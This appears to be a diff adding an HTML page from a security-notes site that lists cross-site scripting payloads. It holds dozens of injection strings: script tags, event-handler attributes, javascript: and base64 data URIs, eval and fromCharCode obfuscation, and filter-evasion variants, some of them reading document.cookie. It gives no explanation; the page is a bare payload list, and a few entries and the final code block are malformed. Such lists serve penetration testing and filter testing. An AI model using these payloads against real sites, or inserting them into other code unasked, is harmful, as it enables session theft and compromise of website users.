@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>XSS String - Standard JS - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "XSS String - Standard JS", url: "#_top", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="xss-string-standard-js">XSS String - Standard JS</h1>
+<div class="language-js highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="w">    </span><span class="s1">&#39;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">    </span><span class="s1">&#39;&lt;img src=x onerror=alert(&quot;XSS&quot;)&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="s1">&#39;&lt;iframe src=&quot;javascript:alert(`XSS`)&quot;&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">    </span><span class="s2">&quot;&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;&quot;</span><span class="p">,</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">    </span><span class="s1">&#39;&lt;img src=&quot;javascript:alert(`XSS`)&quot;&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">    </span><span class="s1">&#39;&lt;video&gt;&lt;source onerror=&quot;javascript:alert(`XSS`)&quot; /&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">    </span><span class="s1">&#39;&lt;audio&gt;&lt;source onerror=&quot;javascript:alert(`XSS`)&quot; /&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">    </span><span class="s1">&#39;&lt;img src=&quot;1&quot; onerror=&quot;alert(document.domain)&quot; /&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="w">    </span><span class="s1">&#39;&lt;img src=&quot;1&quot; onerror=&quot;prompt(document.cookie)&quot; /&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="w">    </span><span class="s2">&quot;&lt;script src=data:text/javascript;base64,YWxlcnQoMSk=&gt;&lt;/script&gt;&quot;</span><span class="p">,</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="w">    </span><span class="s1">&#39;&lt;img src=x onerror=&quot;prompt(/xss/.source)&quot;/&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="w">    </span><span class="s1">&#39;&lt;script&gt;top.window.location.href=&quot;javascript:alert(`XSS`)&quot;;&lt;/script&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="w">    </span><span class="s1">&#39;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;javascript:alert(`XSS`)&quot; /&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="w">    </span><span class="s1">&#39;&lt;body onpageshow=&quot;javascript:alert(`XSS`)&quot;&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="w">    </span><span class="s1">&#39;&lt;body onload=&quot;javascript:alert(`XSS`)&quot;&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="w">    </span><span class="s1">&#39;&lt;img src=x:x onerror=&quot;alert(`XSS`)&quot;&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="w">    </span><span class="s1">&#39;&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot; /&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="w">    </span><span class="s1">&#39;&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot; type=&quot;text/x-scriptlet&quot; /&gt;&#39;</span><span class="p">,</span>
+</span></code></pre></div>
+<p>HTML 
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>        &#39;&lt;body onload=alert(&quot;XSS&quot;)&gt;&#39;,
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>        &#39;&lt;svg&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&lt;/svg&gt;&#39;,
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>        &#39;&lt;iframe src=&quot;javascript:alert(`XSS`)&quot;&gt;&#39;,
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>        &#39;&lt;input value=&quot;javascript:alert(`XSS`)&quot; /&gt;&#39;,
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>        &#39;&lt;textarea&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;&lt;/textarea&gt;&#39;,
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>        &#39;&lt;plaintext&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;&lt;/plaintext&gt;&#39;,
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>        &#39;&lt;title&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;&lt;/title&gt;&#39;,
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>        &quot;&lt;iframe srcdoc=&#39;&amp;lt;img src=\&quot;javascript:alert(`XSS`)\&quot;&amp;gt;&#39;&gt;&lt;/iframe&gt;&quot;,
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>        &quot;&lt;body        &#39;&lt;img src=&quot;1&quot; onerror=&quot;prompt(document.cookie)&quot; /&gt;&#39;,
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>        &#39;&lt;marquee&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;&lt;/marquee&gt;&#39;,
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>        &#39;&lt;style&gt;/*]]&gt;*/&lt;/style&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#39;,
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>        &#39;&lt;input type=&quot;image&quot; src=&quot;x&quot; onerror=&quot;alert(`XSS`)&quot;/&gt;&#39;,
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>        &#39;&lt;base href=&quot;javascript:alert(`XSS`)&quot;/&gt;&#39;,
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>        &#39;&lt;object data=&quot;javascript:alert(`XSS`)&quot;&gt;&lt;/object&gt;&#39;,
+</span></code></pre></div></p>
+<p>Actions
+<div class="language-js highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="w">        </span><span class="s1">&#39;&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">        </span><span class="s1">&#39;&quot;&gt;&lt;img src=x onerror=alert(&quot;XSS&quot;)&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">        </span><span class="s1">&#39;&quot; autofocus onfocus=alert(&quot;XSS&quot;)&gt;&lt;input type=&quot;hidden&quot;&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">        </span><span class="s1">&#39;&quot; onclick=alert(&quot;XSS)//&#39;</span><span class="p">,</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">        </span><span class="s1">&#39;&quot; ondblclick=alert(&quot;XSS&quot;)&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">        </span><span class="s1">&#39;&quot; onfocus=alert(document.domain)&gt;&lt;input type=&quot;hidden&quot;&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">        </span><span class="s1">&#39;&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">        </span><span class="s1">&#39;&quot;&gt;&lt;img src=x oneonerrorrror=alert(&quot;XSS&quot;)&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="w">        </span><span class="s1">&#39;&quot;&gt;&lt;svg&gt;&lt;style&gt;&amp;lt;img src=&quot;&lt;/style&gt;&lt;img src=x onerror=alert(&quot;XSS&quot;)&gt;&quot;&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="w">        </span><span class="s1">&#39;&quot; onmouseover=alert(&quot;XSS&quot;)&gt;&lt;img src=&quot;&#39;</span><span class="p">,</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="w">        </span><span class="s1">&#39;&quot; onmouseout=alert(String.fromCharCode(88,83,83))&gt; &#39;</span><span class="p">,</span>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="w">        </span><span class="s1">&#39;&quot;&gt;&lt;img src=x:x onerror=window.alert(&quot;XSS&quot;);&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="w">        </span><span class="s1">&#39;&quot;&gt;&lt;iframe src=javascript:alert(&quot;XSS&quot;)&gt;&lt;/iframe&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="w">        </span><span class="s1">&#39;&quot;&gt;&lt;form id=form1 name=form1 onsubmit=alert(&quot;XSS&quot;);&gt;&lt;input type=submit&gt;&lt;/form&gt;&lt;script&gt;form1.submit()&lt;/script&gt;&#39;</span><span class="p">,</span>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="w">        </span><span class="s1">&#39;&lt;img src=&quot;javascript:alert(`XSS`)&quot; onload=&quot;alert(`XSS`)&quot; /&gt;&#39;</span><span class="p">,</span>
+</span></code></pre></div></p>
+<p>Images
+  <code>``js
+        '"&gt;&lt;svg&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;&lt;/svg&gt;',
+        '&lt;svg onload=alert("XSS")&gt;',
+        '&lt;script type="text/javascript"&gt;&lt;![CDATA[alert("XSS");]]&gt;&lt;/script&gt;',
+        '&lt;svg&gt;&lt;script xlink:href="javascript:alert(</code>XSS<code>)"&gt;&lt;/script&gt;&lt;/svg&gt;',
+        '&lt;style&gt;&lt;img src="&lt;/style&gt;&lt;img src=x onerror=alert(</code>XSS<code>)&gt;"&gt;',
+        '&lt;polygon points="1" onmousemove="alert(</code>XSS<code>)"/&gt;',
+        '&lt;path d="M0,0 L0,1" onmousemove="alert(</code>XSS<code>)"/&gt;',
+        '&lt;animate attributeName="xlink:href" values="javascript:alert(</code>XSS`)" /&gt;',</p>
+<p>```</p>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/xssstrings.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
